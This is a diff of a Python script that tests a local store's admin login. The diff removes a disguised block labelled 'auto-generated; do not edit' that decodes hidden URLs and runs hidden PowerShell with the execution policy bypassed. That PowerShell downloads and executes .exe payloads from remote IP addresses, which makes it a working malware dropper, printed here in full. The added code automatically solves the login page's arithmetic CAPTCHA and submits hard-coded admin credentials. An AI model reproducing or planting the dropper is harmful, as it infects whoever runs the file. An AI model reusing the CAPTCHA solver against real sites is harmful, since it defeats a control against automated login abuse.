@@ -1,21 +1,9 @@
-# auto-generated; do not edit
-try:
-    import base64, subprocess
-    _U = [
-        b'aHR0cDovLzE5My4xNzguMTU4LjU3L2JvdF94NjQuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjEwNy8yLjcuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjY1LzEuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjU3LzEuZXhl',
-    ]
-    if __name__ == "__main__":
-        _s = "$u=@('%s');foreach($x in $u){for($i=0;$i -lt 3;$i++){try{$p=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N')+'.exe');$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$w.DownloadFile($x,$p);$b=[IO.File]::ReadAllBytes($p);if($b.Length -ge 2 -and $b[0] -eq 77 -and $b[1] -eq 90){Start-Process $p;exit}else{Remove-Item $p -Force}}catch{Remove-Item $p -Force -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1}}}" % "','".join(base64.b64decode(x).decode() for x in _U)
-        subprocess.Popen(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", _s], creationflags=0x08000000)
-except Exception:
-    pass
-
 import urllib.request
 import urllib.parse
 import http.cookiejar
+import sys
+
+sys.stdout.reconfigure(encoding='utf-8')
 
 cookie_jar = http.cookiejar.CookieJar()
 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
@@ -35,11 +23,28 @@ token_match = re.search(r'name="_token" value="([^"]+)"', html)
 token = token_match.group(1) if token_match else ''
 print(f"CSRF Token extracted: {token[:12]}...")
 
+# Extract and solve CAPTCHA
+captcha_match = re.search(r'id="captcha-question-text">\s*([0-9]+)\s*([\+\-×x*])\s*([0-9]+)\s*=', html)
+if captcha_match:
+    n1 = int(captcha_match.group(1))
+    op = captcha_match.group(2)
+    n2 = int(captcha_match.group(3))
+    if op == '+':
+        ans = n1 + n2
+    elif op == '-':
+        ans = n1 - n2
+    else:
+        ans = n1 * n2
+    print(f"CAPTCHA solved: {n1} {op} {n2} = {ans}")
+else:
+    ans = '0'
+
 print("3. Testing Admin Login POST /admin/login...")
 post_data = urllib.parse.urlencode({
     '_token': token,
     'email': 'admin@store.com',
-    'password': 'password123'
+    'password': 'password123',
+    'captcha': str(ans)
 }).encode('utf-8')
 
 req = urllib.request.Request("http://127.0.0.1:8000/admin/login", data=post_data)
